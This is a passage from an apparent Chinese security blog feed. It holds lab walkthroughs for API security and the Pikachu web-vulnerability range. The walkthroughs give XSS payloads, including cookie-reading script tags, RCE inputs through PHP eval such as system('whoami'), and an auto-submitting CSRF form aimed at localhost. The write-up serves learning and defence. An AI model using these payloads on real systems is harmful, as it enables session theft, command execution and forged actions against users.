data-src="52.png"></p><p>提示缺少三个参数，我们补充好试试：</p><p><img lazyload alt="image" data-src="53.png"></p><p><img lazyload alt="image" data-src="54.png"></p><p>添加成功！</p><h1 id="AddLab2-支付漏洞"><a href="#AddLab2-支付漏洞" class="headerlink" title="AddLab2:支付漏洞"></a>AddLab2:支付漏洞</h1><p>同lab8抓包，修改quantity为负数：</p><p><img lazyload alt="image" data-src="55.png"></p><p><img lazyload alt="image" data-src="56.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    这个靶场差不多打了半天，主要是照着WP打，然后分析背后的原理以及为什么会这样去打。通过本次靶场学习我对API安全有了更深的认识，之前觉得比较抽象。同时也对HTTP中的GET\POST\PUT\DELETE\OPTIONS等协议有了更深刻的理解。同时在分析lab有些题目的时候，我学习了NoSQL注入的方式，对Mongodb这些非关系型数据库有了基本的认识。同时，精进了我对Burp Suite的操作。</p><p>​    美中不足的就是我对 JWT 相关知识不太熟悉，打完靶场后也没太懂这个东西有什么用处。这是我后面需要进行补充学习的。</p><p>​    总的来说，本靶场认真打下来的话，我相信你会对API安全有不一样的认识和理解！</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场学习记录</title>
      <link href="/2023/07/08/Pikachu%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/08/Pikachu%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>少就是多,慢就是快</p></blockquote><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><blockquote><ul><li>Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students &amp; teachers to learn about web application security in a controlled class room environment.</li><li>The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface.    </li></ul></blockquote><h2 id="我的目标"><a href="#我的目标" class="headerlink" title="我的目标"></a>我的目标</h2><blockquote><ul><li>结合DWMA靶场快速入门常见Web安全漏洞类型，把面铺得更广更开一点！</li><li>为了避免重复造轮子以及提升效率，本记录会比较简洁！</li><li>预计五天时间完结？From 2023/7/9.</li></ul></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>​    略，网上教程一大堆懒得写了。主要是靶场提前搭建好了才开始写此篇的。</p><h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>先前端修改可输出数量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;c2yb8er&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>先登录admin/123456，后可以注入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;c2yb8er&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>在 JavaScript 中，<code>document</code> 是一个全局对象，代表当前 HTML 文档的根节点。它提供了访问和操作当前文档的各种属性和方法。</p><p>除了 <code>document</code> 对象本身之外，<code>document</code> 对象还具有许多后缀属性和方法，用于访问和操作文档中的不同部分和元素。下面是一些常见的 <code>document</code> 对象的后缀属性和方法：</p><ul><li><code>document.documentElement</code>：表示当前文档的根元素 <code>&lt;html&gt;</code>。</li><li><code>document.body</code>：表示当前文档的 <code>&lt;body&gt;</code> 元素。</li><li><code>document.head</code>：表示当前文档的 <code>&lt;head&gt;</code> 元素。</li><li><code>document.title</code>：表示当前文档的标题，可以读取或修改文档标题。</li><li><code>document.forms</code>：表示当前文档中的表单元素的集合。</li><li><code>document.links</code>：表示当前文档中的链接元素的集合。</li><li><code>document.images</code>：表示当前文档中的图片元素的集合。</li><li><code>document.getElementById()</code>：根据元素的 ID 属性获取对应的元素。</li><li><code>document.getElementsByClassName()</code>：根据类名获取一组元素。</li><li><code>document.getElementsByTagName()</code>：根据标签名获取一组元素。</li><li><code>document.createElement()</code>：创建一个新的 HTML 元素。</li><li><code>document.createTextNode()</code>：创建一个新的文本节点。</li><li><code>document.querySelector()</code>：使用 CSS 选择器获取第一个匹配的元素。</li><li><code>document.querySelectorAll()</code>：使用 CSS 选择器获取所有匹配的元素。</li></ul></blockquote><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;c2yb8er&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><blockquote><p>感觉这玩意跟SQL注入一样</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function domxss()</span><br><span class="line">&#123;</span><br><span class="line">  var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">  document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see&lt;/a&gt;&quot;;</span><br><span class="line">&#125;                </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=x onerror=alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&gt;</span></span><br><span class="line"><span class="string">-----------达成效果-----------</span></span><br><span class="line"><span class="string">&lt;div id=&quot;dom&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&quot;&gt;&#x27;</span>&amp;gt;what <span class="keyword">do</span> you see?</span><br><span class="line">&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">-----------这是分割线-----------</span><br><span class="line"><span class="string">&#x27; onclick=&quot;alert(&#x27;</span>xss<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string">-----------达成效果-----------</span></span><br><span class="line"><span class="string">&lt;a href=&quot;&quot; onclick=&quot;alert(&#x27;</span>xss<span class="string">&#x27;)&quot;&gt;&#x27;</span>&amp;gt;what <span class="keyword">do</span> you see?&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">    <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;              </span><br></pre></td></tr></table></figure><ul><li><code>window.location.search</code>：获取当前页面 URL 中的查询参数部分，包括问号 <code>?</code>。</li><li><code>decodeURIComponent(str.split(&quot;text=&quot;)[1])</code>：将查询参数部分解码，并从中提取名为 “text” 的参数值。<code>str.split(&quot;text=&quot;)</code> 将查询参数字符串拆分为一个数组，使用 “text=” 作为分隔符，然后选择数组的第二个元素（索引为 1）。<code>decodeURIComponent()</code> 用于对 URL 编码的特殊字符进行解码，确保文本的正确性。</li><li><code>txss.replace(/\+/g,&#39; &#39;)</code>：在从查询参数中提取的文本中，使用正则表达式 <code>/+/g</code> 将所有的加号 <code>+</code> 替换为空格 <code>&#39; &#39;</code>。这是因为在 URL 中，加号 <code>+</code> 通常表示空格。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><p>得点击一下<code>有些费尽心机想要忘记的事情,后来真的就忘掉了</code>才出来</p><h2 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;c2yb8er&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>前端注入，后台遭殃。</p><h2 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2><p>注入发现过滤了<code>&gt;</code>，这……看看源码吧！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;message&#x27;] != null)&#123;</span><br><span class="line">    //这里会使用正则对&lt;script进行替换为空,也就是过滤掉</span><br><span class="line">    $message=preg_replace(&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;, &#x27;&#x27;, $_GET[&#x27;message&#x27;]);</span><br><span class="line">//    $message=str_ireplace(&#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&#x27;,$_GET[&#x27;message&#x27;]);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    if($message == &#x27;yes&#x27;)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        $html.=&quot;<span class="tag">&lt;<span class="name">p</span>&gt;</span>那就去人民广场一个人坐一会儿吧!<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;else&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        $html.=&quot;<span class="tag">&lt;<span class="name">p</span>&gt;</span>别说这些&#x27;&#123;$message&#125;&#x27;的话,不要怕,就是干!<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br></pre></td></tr></table></figure><p>好家伙，欺骗一好手！居然不是过滤<code>&gt;</code>而是过滤了<code>&lt;script</code>这样好办了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p>这个函数是我认为安全的方式，我暂时绕不过看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$html1</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$html2</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理</span></span><br><span class="line">        <span class="variable">$message</span>=<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$html2</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt;<span class="subst">&#123;$message&#125;</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好神奇，他没有转义<code>&#39;</code>字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=alert(&#x27;c2yb8er&#x27;) &#x27;</span><br><span class="line">----------闭合后----------</span><br><span class="line">&lt;a href=&quot;#&quot; onclick=&quot;alert(&#x27;c2yb8er&#x27;)&quot; &#x27;&#x27;&gt;#&#x27; onclick=alert(&#x27;c2yb8er&#x27;) &#x27;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>有点懵逼，搞明白了，这是一个php版本的问题：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.63zyvkoockw0.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.18fuy9fck7a8.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.1n1r7sp79y00.png"></p><h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>以为跟DOM-xss差不多，但是试了下不太行，看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好家伙，<code>&lt;a标签的href属性里面,可以使用javascript协议来执行js</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&quot;xss&quot;)</span><br></pre></td></tr></table></figure><p><mark>补充&lt;a标签相关知识：</mark></p><p><strong>防御href方式 :</strong></p><ul><li>输入的时候只允许 http 或 https 开头的协议，才允许输出</li><li>其次再进行htmlspecialchars处理</li></ul><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><blockquote><p>RCE(Remote Command/Code Execute)，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p></blockquote><h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p>同DVMA-LOW类型</p><h2 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2><p>输入了一个字符串就出现了报错了，看看题目<code>eval</code>去了解一下：</p><blockquote><p><code>eval()</code>是PHP的一个函数，用于执行包含在字符串中的PHP代码。它将字符串中的代码作为参数传递，并在运行时将其解析和执行。</p><p><code>eval()</code>函数的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>)</span><br></pre></td></tr></table></figure><p>参数<code>$code</code>是一个包含要执行的PHP代码的字符串。</p></blockquote><p>只要输入正确参数就能执行：<mark>这里一开始我也这样试了，但是忘记加分号结束了….</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;pika~pika&quot;;</span><br><span class="line">phpinfo();</span><br><span class="line">system(&#x27;chdir&#x27;);</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>同DVMA-LOW类型</p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>因为采用了post的方式，我们没有办法用get方式那样的url进行构造了，还有什么办法呢？</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.m5h5o6ompjk.png"></p><p>利用工具<code>CSRFTest</code></p><p>这是它帮我生成的html文件，我们可以伪造这个页面，诱惑用户点击即可修改：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>OWASP CRSFTester Demonstration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;javascript:fireForms()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JavaScript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pauses = <span class="keyword">new</span> <span class="title class_">Array</span>( <span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span> );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">pausecomp</span>(<span class="params">millis</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> curDate = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">do</span> &#123; curDate = <span class="keyword">new</span> <span class="title class_">Date</span>(); &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">while</span>(curDate-date &lt; millis);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">fireForms</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">2</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> i=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;count; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">forms</span>[i].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">pausecomp</span>(pauses[i]);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>OWASP CRSFTester Demonstration<span class="tag">&lt;/<span class="name">H2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form0&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:80/PKQ/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><code>pausecomp(millis)</code>函数用于在执行期间产生暂停效果。它根据传入的<code>millis</code>参数（以毫秒为单位）设置一个延迟，通过循环等待指定的时间间隔。</li><li><mark>fireForms()函数</mark>（比较有实战价值）用于自动提交表单。它首先定义了一个变量<code>count</code>为2，然后通过一个循环来处理表单。在每次循环中，它通过<code>document.forms[i].submit()</code>来提交第<code>i</code>个表单。然后，通过调用<code>pausecomp(pauses[i])</code>来暂停一段时间，由数组<code>pauses</code>中的值控制暂停时间。</li></ul></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.4d20lm4cky60.png"></p><h2 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.4s9o8tdmwcc0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成一个token,以当前微妙时间+一个5位的前缀</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span 